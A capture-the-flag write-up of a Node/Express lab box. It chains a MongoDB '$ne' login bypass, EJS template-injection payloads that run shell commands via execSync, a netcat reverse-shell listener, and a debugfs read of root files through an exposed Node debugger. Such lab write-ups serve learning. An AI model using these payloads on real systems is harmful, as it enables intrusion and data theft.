# Do Not Disturb

Room from Hacker Holidays 2026 (Byte Lotus Hotel series). Web + boot2root, chains a NoSQL auth bypass into an SSTI bug, then pivots off an exposed Node debugger to get root. Took me longer than I expected. Mostly lost time fighting with Burp before I gave up and just used curl for the injection.

# Recon

Started with the usual nmap sweep:

```
nmap -sC -sV -oN nmap_initial.txt 10.130.132.101
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus &mdash; Poolside
```

So port 80 is a Node/Express app, title "Byte Lotus Poolside." Loaded it in the browser and got a login form, "Staff / Guest ID" and "Passphrase," with `attendant` sitting in the ID box as a placeholder. Figured that was a hint at a valid username.

# Auth bypass

Tried going through Burp first to intercept the login POST and rewrite the body, but kept mangling the raw request (deleted headers by accident, broke Content-Length, the works) and ended up getting "failed to connect" errors. Gave up on the GUI fiddling and just sent the request straight with curl instead, way less fragile:

```
curl -i -X POST http://10.130.132.101/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'id[$ne]=1&passphrase[$ne]=1'
```

The backend's clearly MongoDB backed, so `$ne` (not equal) as the value instead of a real password makes the query match basically any record where the id/passphrase field isn't literally `1`, which is every real account. No actual credentials needed.

Response came back with a `Set-Cookie: connect.sid=...` header, which is the session token. Reused that cookie for follow-up requests:

```
curl -b "connect.sid=<cookie_value>" http://10.130.132.101/staff
```

That got me into the staff console.

# SSTI

The staff page has a spot to customize a booking confirmation message, rendered through what looks like an EJS template. Tested it with:

```
<%= 7*7 %>
```

Came back as `49` instead of literal text, so it's actually evaluating the input server-side. Confirmed SSTI.

Since EJS is just JS running server-side, that means access to Node's built-ins. Went for command execution:

```
<%= process.mainModule.require('child_process').execSync('id').toString() %>
```

Worked, and from there just swapped the command to grab the flag file:

```
<%= process.mainModule.require('child_process').execSync('cat /home/*/user.txt').toString() %>
```

# Getting a shell

Set a listener going first:

```
nc -lvnp 4444
```

Then ran a reverse shell one-liner through the same SSTI field (spawn bash back to my listener IP/port). Landed as a low priv service account.

# Local enum and privesc

Checked local listening sockets:

```
ss -tlnu
```

Nothing exciting externally, but there was a service bound to `127.0.0.1:9229`. That's the default Node.js Inspector/debugger port. Left open, presumably for dev purposes and never locked down.

Connected to it:

```
node inspect 127.0.0.1:9229
```

Dropped into the REPL and checked who that process actually runs as:

```
process.getuid()
process.getgid()
```

Different uid/gid than my current shell, confirming the debugger's attached to a separate, more privileged service account. Group membership included `disk`. Members of that group can read raw block devices directly, bypassing normal file permission checks entirely.

Used the process's own `child_process` module to run `debugfs` against the raw disk and cat root's flag straight off the filesystem, skipping the permission check altogether:

```js
process.getBuiltinModule('child_process').execFileSync(
  '/usr/sbin/debugfs',
  ['-R', 'cat /root/root.txt', '/dev/nvme0n1p1'],
  { encoding: 'utf8' }
)
```

(worth checking `lsblk` first if the device path doesn't match. this room used an nvme device, but that could vary)

# Flags

```
user.txt - from the SSTI RCE step
root.txt - from the debugfs read via the Node inspector
```

# Stuff I took away from this one

- Burp is great once you know its quirks, but for a quick one-shot injection like this, curl is way less painful and harder to accidentally break.
- `$ne` on a MongoDB backed login is basically "match anything," worth trying on any app that smells like Mongo + Express.
- Always test SSTI with something harmless first (`7*7`) before jumping straight to command execution. Confirms you're actually in the right spot before you start guessing payloads.
- A debugger left listening on loopback is a full privesc path on its own if it's running under a more privileged account. Treat any open inspector port as game over for that account's privileges.
- `disk` group membership is a straight line to root owned files via tools like `debugfs`, no exploit needed. It's just how the permission model works.

# Tools I used

- nmap
- Firefox
- curl (ended up preferring this over Burp for the injection)
- netcat
- node inspect (built-in Node.js debugger client)
